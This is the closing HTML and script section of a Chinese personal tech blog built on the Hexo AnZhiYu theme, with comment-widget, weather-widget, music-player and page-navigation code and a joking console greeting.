style="font-size: 0.88rem;">express<sup>1</sup></a><a href="/tags/git/" style="font-size: 0.88rem;">git<sup>1</sup></a><a href="/tags/hexo/" style="font-size: 0.88rem;">hexo<sup>5</sup></a><a href="/tags/javascript/" style="font-size: 0.88rem;">javascript<sup>7</sup></a><a href="/tags/kali/" style="font-size: 0.88rem;">kali<sup>1</sup></a><a href="/tags/leetcode/" style="font-size: 0.88rem;">leetcode<sup>1</sup></a><a href="/tags/lerna/" style="font-size: 0.88rem;">lerna<sup>1</sup></a><a href="/tags/linux/" style="font-size: 0.88rem;">linux<sup>1</sup></a><a href="/tags/matery/" style="font-size: 0.88rem;">matery<sup>2</sup></a><a href="/tags/monorepo/" style="font-size: 0.88rem;">monorepo<sup>1</sup></a><a href="/tags/node-js/" style="font-size: 0.88rem;">node.js<sup>2</sup></a><a href="/tags/pinia/" style="font-size: 0.88rem;">pinia<sup>1</sup></a><a href="/tags/pyqt/" style="font-size: 0.88rem;">pyqt<sup>1</sup></a><a href="/tags/this/" style="font-size: 0.88rem;">this<sup>1</sup></a><a href="/tags/vite/" style="font-size: 0.88rem;">vite<sup>2</sup></a><a href="/tags/vue3/" style="font-size: 0.88rem;">vue3<sup>3</sup></a><a href="/tags/webpack/" style="font-size: 0.88rem;">webpack<sup>1</sup></a><a href="/tags/workspace/" style="font-size: 0.88rem;">workspace<sup>1</sup></a><a href="/tags/%E5%85%BC%E5%AE%B9%E6%80%A7/" style="font-size: 0.88rem;">兼容性<sup>1</sup></a><a href="/tags/%E5%89%8D%E7%AB%AF/" style="font-size: 0.88rem;">前端<sup>1</sup></a><a href="/tags/%E5%BC%80%E5%8F%91%E8%A7%84%E8%8C%83/" style="font-size: 0.88rem;">开发规范<sup>2</sup></a><a href="/tags/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F/" style="font-size: 0.88rem;">微信小程序<sup>4</sup></a><a href="/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/" style="font-size: 0.88rem;">操作系统<sup>3</sup></a><a href="/tags/%E6%95%B0%E7%BB%84/" style="font-size: 0.88rem;">数组<sup>1</sup></a><a href="/tags/%E7%BD%91%E7%AB%99%E4%BE%BF%E7%AD%BE/" style="font-size: 0.88rem;">网站便签<sup>1</sup></a><a href="/tags/%E9%9D%A2%E8%AF%95/" style="font-size: 0.88rem;">面试<sup>1</sup></a></div></div><hr/></div></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="anzhiyufont anzhiyu-icon-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="anzhiyufont anzhiyu-icon-gear"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="anzhiyufont anzhiyu-icon-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="anzhiyufont anzhiyu-icon-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></button></div></div><div id="nav-music"><a id="nav-music-hoverTips" onclick="anzhiyu.musicToggle()" accesskey="m">播放音乐</a><div id="console-music-bg"></div><meting-js id="8152976493" server="netease" type="playlist" mutex="true" preload="none" theme="var(--anzhiyu-main)" data-lrctype="0" order="random"></meting-js></div><div id="rightMenu"><div class="rightMenu-group rightMenu-small"><div class="rightMenu-item" id="menu-backward"><i class="anzhiyufont anzhiyu-icon-arrow-left"></i></div><div class="rightMenu-item" id="menu-forward"><i class="anzhiyufont anzhiyu-icon-arrow-right"></i></div><div class="rightMenu-item" id="menu-refresh"><i class="anzhiyufont anzhiyu-icon-arrow-rotate-right" style="font-size: 1rem;"></i></div><div class="rightMenu-item" id="menu-top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></div></div><div class="rightMenu-group rightMenu-line rightMenuPlugin"><div class="rightMenu-item" id="menu-copytext"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制选中文本</span></div><div class="rightMenu-item" id="menu-pastetext"><i class="anzhiyufont anzhiyu-icon-paste"></i><span>粘贴文本</span></div><a class="rightMenu-item" id="menu-commenttext"><i class="anzhiyufont anzhiyu-icon-comment-medical"></i><span>引用到评论</span></a><div class="rightMenu-item" id="menu-newwindow"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开</span></div><div class="rightMenu-item" id="menu-copylink"><i class="anzhiyufont anzhiyu-icon-link"></i><span>复制链接地址</span></div><div class="rightMenu-item" id="menu-copyimg"><i class="anzhiyufont anzhiyu-icon-images"></i><span>复制此图片</span></div><div class="rightMenu-item" id="menu-downloadimg"><i class="anzhiyufont anzhiyu-icon-download"></i><span>下载此图片</span></div><div class="rightMenu-item" id="menu-newwindowimg"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开图片</span></div><div class="rightMenu-item" id="menu-search"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>站内搜索</span></div><div class="rightMenu-item" id="menu-searchBaidu"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>百度搜索</span></div><div class="rightMenu-item" id="menu-music-toggle"><i class="anzhiyufont anzhiyu-icon-play"></i><span>播放音乐</span></div><div class="rightMenu-item" id="menu-music-back"><i class="anzhiyufont anzhiyu-icon-backward"></i><span>切换到上一首</span></div><div class="rightMenu-item" id="menu-music-forward"><i class="anzhiyufont anzhiyu-icon-forward"></i><span>切换到下一首</span></div><div class="rightMenu-item" id="menu-music-playlist" onclick="window.open(&quot;https://y.qq.com/n/ryqq/playlist/8802438608&quot;, &quot;_blank&quot;);" style="display: none;"><i class="anzhiyufont anzhiyu-icon-radio"></i><span>查看所有歌曲</span></div><div class="rightMenu-item" id="menu-music-copyMusicName"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制歌名</span></div></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item menu-link" id="menu-randomPost"><i class="anzhiyufont anzhiyu-icon-shuffle"></i><span>随便逛逛</span></a><a class="rightMenu-item menu-link" href="/categories/"><i class="anzhiyufont anzhiyu-icon-cube"></i><span>博客分类</span></a><a class="rightMenu-item menu-link" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags"></i><span>文章标签</span></a></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item" id="menu-copy" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制地址</span></a><a class="rightMenu-item" id="menu-commentBarrage" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-message"></i><span class="menu-commentBarrage-text">关闭热评</span></a><a class="rightMenu-item" id="menu-darkmode" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span class="menu-darkmode-text">深色模式</span></a><a class="rightMenu-item" id="menu-translate" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-language"></i><span>轉為繁體</span></a></div></div><div id="rightmenu-mask"></div><div id="he-plugin-simple"></div><script>var WIDGET = {
  "CONFIG": {
    "modules": "0124",
    "background": "2",
    "tmpColor": "FFFFFF",
    "tmpSize": "16",
    "cityColor": "FFFFFF",
    "citySize": "16",
    "aqiColor": "E8D87B",
    "aqiSize": "16",
    "weatherIconSize": "24",
    "alertIconSize": "18",
    "padding": "10px 10px 10px 10px",
    "shadow": "0",
    "language": "auto",
    "borderRadius": "20",
    "fixed": "true",
    "vertical": "top",
    "horizontal": "left",
    "left": "20",
    "top": "7.1",
    "key": "df245676fb434a0691ead1c63341cd94"
  }
}
</script><link rel="stylesheet" href="https://widget.qweather.net/simple/static/css/he-simple.css?v=1.4.0"/><script src="https://widget.qweather.net/simple/static/js/he-simple.js?v=1.4.0"></script><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.cbd.int/@fancyapps/ui@5.0.20/dist/fancybox/fancybox.umd.js"></script><script src="https://cdn.cbd.int/instant.page@5.2.0/instantpage.js" type="module"></script><script src="https://cdn.cbd.int/vanilla-lazyload@17.8.4/dist/lazyload.iife.min.js"></script><script src="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.js"></script><canvas id="universe"></canvas><script async src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/dark/dark.js"></script><script>// 消除控制台打印
var HoldLog = console.log;
console.log = function () {};
let now1 = new Date();
queueMicrotask(() => {
  const Log = function () {
    HoldLog.apply(console, arguments);
  }; //在恢复前输出日志
  const grt = new Date("04/01/2021 00:00:00"); //此处修改你的建站时间或者网站上线时间
  now1.setTime(now1.getTime() + 250);
  const days = (now1 - grt) / 1000 / 60 / 60 / 24;
  const dnum = Math.floor(days);
  const ascll = [
    `欢迎使用安知鱼!`,
    `生活明朗, 万物可爱`,
    `
        
       █████╗ ███╗   ██╗███████╗██╗  ██╗██╗██╗   ██╗██╗   ██╗
      ██╔══██╗████╗  ██║╚══███╔╝██║  ██║██║╚██╗ ██╔╝██║   ██║
      ███████║██╔██╗ ██║  ███╔╝ ███████║██║ ╚████╔╝ ██║   ██║
      ██╔══██║██║╚██╗██║ ███╔╝  ██╔══██║██║  ╚██╔╝  ██║   ██║
      ██║  ██║██║ ╚████║███████╗██║  ██║██║   ██║   ╚██████╔╝
      ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝    ╚═════╝
        
        `,
    "已上线",
    dnum,
    "天",
    "©2020 By 安知鱼 V1.6.5",
  ];
  const ascll2 = [`NCC2-036`, `调用前置摄像头拍照成功，识别为【小笨蛋】.`, `Photo captured: `, `🤪`];

  setTimeout(
    Log.bind(
      console,
      `\n%c${ascll[0]} %c ${ascll[1]} %c ${ascll[2]} %c${ascll[3]}%c ${ascll[4]}%c ${ascll[5]}\n\n%c ${ascll[6]}\n`,
      "color:#3b70fc",
      "",
      "color:#3b70fc",
      "color:#3b70fc",
      "",
      "color:#3b70fc",
      ""
    )
  );
  setTimeout(
    Log.bind(
      console,
      `%c ${ascll2[0]} %c ${ascll2[1]} %c \n${ascll2[2]} %c\n${ascll2[3]}\n`,
      "color:white; background-color:#4fd953",
      "",
      "",
      'background:url("https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/tinggge.gif") no-repeat;font-size:450%'
    )
  );

  setTimeout(Log.bind(console, "%c WELCOME %c 你好，小笨蛋.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(
      console,
      "%c ⚡ Powered by 安知鱼 %c 你正在访问 kif 的博客.",
      "color:white; background-color:#f0ad4e",
      ""
    )
  );

  setTimeout(Log.bind(console, "%c W23-12 %c 你已打开控制台.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(console, "%c S013-782 %c 你现在正处于监控中.", "color:white; background-color:#d9534f", "")
  );
});</script><script async src="/anzhiyu/random.js"></script><div class="js-pjax"><script>(() => {
  const initValine = () => {
    const valine = new Valine(Object.assign({
      el: '#vcomment',
      appId: 'b7AAVOuWhWIEQsQfviV12FRp-gzGzoHsz',
      appKey: 'TYFSaiPIN5WAmTU3nv8wG8wb',
      avatar: 'mp',
      serverURLs: '',
      emojiMaps: "",
      path: window.location.pathname,
      visitor: true
    }, null))
  }

  const loadValine = async () => {
    if (typeof Valine === 'function') initValine()
    else {
      await getScript('https://cdn.cbd.int/valine@1.5.1/dist/Valine.min.js')
      initValine()
    }
  }

  if ('Valine' === 'Valine' || !false) {
    if (false) anzhiyu.loadComment(document.getElementById('vcomment'),loadValine)
    else setTimeout(loadValine, 0)
  } else {
    window.loadOtherComment = loadValine
  }
})()</script><input type="hidden" name="page-type" id="page-type" value="post"></div><script src="https://cdn.cbd.int/blueimp-md5@2.19.0/js/md5.min.js"></script><script>window.addEventListener('load', () => {
  const changeContent = (content) => {
    if (content === '') return content

    content = content.replace(/<img.*?src="(.*?)"?[^\>]+>/ig, '[图片]') // replace image link
    content = content.replace(/<a[^>]+?href=["']?([^"']+)["']?[^>]*>([^<]+)<\/a>/gi, '[链接]') // replace url
    content = content.replace(/<pre><code>.*?<\/pre>/gi, '[代码]') // replace code
    content = content.replace(/<[^>]+>/g,"") // remove html tag

    if (content.length > 150) {
      content = content.substring(0,150) + '...'
    }
    return content
  }

  const getIcon = (icon, mail) => {
    if (icon) return icon
    let defaultIcon = '?d=mp'
    let iconUrl = `https://gravatar.loli.net/avatar/${md5(mail.toLowerCase()) + defaultIcon}`
    return iconUrl
  }

  const generateHtml = array => {
    let result = ''

    if (array.length) {
      for (let i = 0; i < array.length; i++) {
        result += '<div class=\'aside-list-item\'>'

        if (true) {
          const name = 'data-lazy-src'
          result += `<a href='${array[i].url}' class='thumbnail'><img ${name}='${array[i].avatar}' alt='${array[i].nick}'></a>`
        }

        result += `<div class='content'>
        <a class='comment' href='${array[i].url}' title='${array[i].content}'>${array[i].content}</a>
        <div class='name'><span>${array[i].nick} / </span><time datetime="${array[i].date}">${anzhiyu.diffDate(array[i].date, true)}</time></div>
        </div></div>`
      }
    } else {
      result += '没有评论'
    }

    let $dom = document.querySelector('#card-newest-comments .aside-list')
    $dom.innerHTML= result
    window.lazyLoadInstance && window.lazyLoadInstance.update()
    window.pjax && window.pjax.refresh($dom)
  }

  const getComment = () => {
    const serverURL = 'https://b7AAVOuW.api.lncldglobal.com'

    var settings = {
      "method": "GET",
      "headers": {
        "X-LC-Id": 'b7AAVOuWhWIEQsQfviV12FRp-gzGzoHsz',
        "X-LC-Key": 'TYFSaiPIN5WAmTU3nv8wG8wb',
        "Content-Type": "application/json"
      },
    }

    fetch(`${serverURL}/1.1/classes/Comment?limit=6&order=-createdAt`,settings)
      .then(response => response.json())
      .then(data => {
        const valineArray = data.results.map(function (e) {
          return {
            'avatar': getIcon(e.QQAvatar, e.mail),
            'content': changeContent(e.comment),
            'nick': e.nick,
            'url': e.url + '#' + e.objectId,
            'date': e.updatedAt,
          }
        })
        saveToLocal.set('valine-newest-comments', JSON.stringify(valineArray), 10/(60*24))
        generateHtml(valineArray)
      }).catch(e => {
        const $dom = document.querySelector('#card-newest-comments .aside-list')
        $dom.textContent= "无法获取评论，请确认相关配置是否正确"
      }) 
  }

  const newestCommentInit = () => {
    if (document.querySelector('#card-newest-comments .aside-list')) {
      const data = saveToLocal.get('valine-newest-comments')
      if (data) {
        generateHtml(JSON.parse(data))
      } else {
        getComment()
      }
    }
  }

  newestCommentInit()
  document.addEventListener('pjax:complete', newestCommentInit)
})</script><script>var visitorMail = "kif101001000@163.com";
</script><script async data-pjax src="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/waterfall/waterfall.js"></script><script src="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/qrcodejs/1.0.0/qrcode.min.js"></script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.9/icon/ali_iconfont_css.css"><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/aplayer/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.cbd.int/anzhiyu-blog-static@1.0.1/js/APlayer.min.js"></script><script src="https://cdn.cbd.int/hexo-anzhiyu-music@1.0.1/assets/js/Meting2.min.js"></script><script src="https://cdn.cbd.int/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
var pjax = new Pjax({
  elements: 'a:not([target="_blank"])',
  selectors: pjaxSelectors,
  cacheBust: false,
  analytics: false,
  scrollRestoration: false
})

document.addEventListener('pjax:send', function () {
  // removeEventListener scroll 
  anzhiyu.removeGlobalFnEvent('pjax')
  anzhiyu.removeGlobalFnEvent('themeChange')

  document.getElementById('rightside').classList.remove('rightside-show')
  
  if (window.aplayers) {
    for (let i = 0; i < window.aplayers.length; i++) {
      if (!window.aplayers[i].options.fixed) {
        window.aplayers[i].destroy()
      }
    }
  }

  typeof typed === 'object' && typed.destroy()

  //reset readmode
  const $bodyClassList = document.body.classList
  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
})

document.addEventListener('pjax:complete', function () {
  window.refreshFn()

  document.querySelectorAll('script[data-pjax]').forEach(item => {
    const newScript = document.createElement('script')
    const content = item.text || item.textContent || item.innerHTML || ""
    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
    newScript.appendChild(document.createTextNode(content))
    item.parentNode.replaceChild(newScript, item)
  })

  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()

  typeof chatBtnFn === 'function' && chatBtnFn()
  typeof panguInit === 'function' && panguInit()

  // google analytics
  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});

  // baidu analytics
  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);

  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()

  // prismjs
  typeof Prism === 'object' && Prism.highlightAll()
})

document.addEventListener('pjax:error', e => {
  if (e.request.status === 404) {
    pjax.loadUrl('/404.html')
  }
})</script><script charset="UTF-8" src="https://cdn.cbd.int/anzhiyu-theme-static@1.1.5/accesskey/accesskey.js"></script></div><div id="popup-window"><div class="popup-window-title">通知</div><div class="popup-window-divider"></div><div class="popup-window-content"><div class="popup-tip">你好呀</div><div class="popup-link"><i class="anzhiyufont anzhiyu-icon-arrow-circle-right"></i></div></div></div></body></html>